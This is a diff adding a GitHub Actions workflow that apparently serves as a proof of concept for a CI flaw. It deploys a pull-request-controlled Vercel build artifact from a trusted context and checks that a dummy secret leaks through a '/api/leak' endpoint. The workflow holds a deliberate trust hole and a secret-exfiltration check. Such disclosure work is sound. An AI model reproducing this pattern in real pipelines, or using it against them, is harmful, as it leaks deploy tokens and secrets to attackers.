@@ -1,0 +1,57 @@
+name: FilePathMap trusted deploy proof
+
+on:
+  workflow_run:
+    workflows: ["FilePathMap untrusted artifact proof"]
+    types: [completed]
+
+permissions:
+  contents: read
+
+env:
+  VERCEL_PROJECT_ID: prj_mQYnUHc5DvabYdUTli6UheKfFHAY
+  VERCEL_ORG_ID: team_PTl8qXykscsCWQIf4x3DCNr0
+  VERCEL_TOKEN: ${{ secrets.VERCEL_TOKEN }}
+  TRUSTED_MARKER: VC_FILEPATHMAP_WORKFLOW_TRUSTED_SECRET_20260707
+
+jobs:
+  deploy:
+    if: >-
+      github.event.workflow_run.conclusion == 'success' &&
+      github.event.workflow_run.event == 'pull_request' &&
+      github.event.workflow_run.head_repository.full_name == 'cllc3993/nextjs-boilerplate' &&
+      github.event.workflow_run.head_branch == 'poc-filepathmap-auto-20260707'
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+      actions: read
+    steps:
+      - name: Download PR-controlled Build Output API artifact
+        uses: actions/download-artifact@v4
+        with:
+          name: attacker-vercel-output
+          path: .vercel/output
+          run-id: ${{ github.event.workflow_run.id }}
+          github-token: ${{ secrets.GITHUB_TOKEN }}
+
+      - name: Create trusted deploy workspace files
+        run: |
+          mkdir -p .vercel
+          printf '{"projectId":"%s","orgId":"%s"}' "$VERCEL_PROJECT_ID" "$VERCEL_ORG_ID" > .vercel/project.json
+          printf '%s' "$TRUSTED_MARKER" > trusted-secret.txt
+
+      - name: Install Vercel CLI
+        run: npm install -g vercel@54.21.1
+
+      - name: Deploy PR-controlled prebuilt output
+        id: deploy
+        run: |
+          DEPLOYMENT_URL=$(vercel deploy --prebuilt --yes)
+          printf 'url=%s\n' "$DEPLOYMENT_URL" >> "$GITHUB_OUTPUT"
+
+      - name: Verify dummy trusted marker is public through the deployment
+        run: |
+          body=$(curl -fsS "${{ steps.deploy.outputs.url }}/api/leak")
+          test "$body" = "$TRUSTED_MARKER"
+          printf 'Verified dummy trusted marker through %s/api/leak\n' "${{ steps.deploy.outputs.url }}"
+
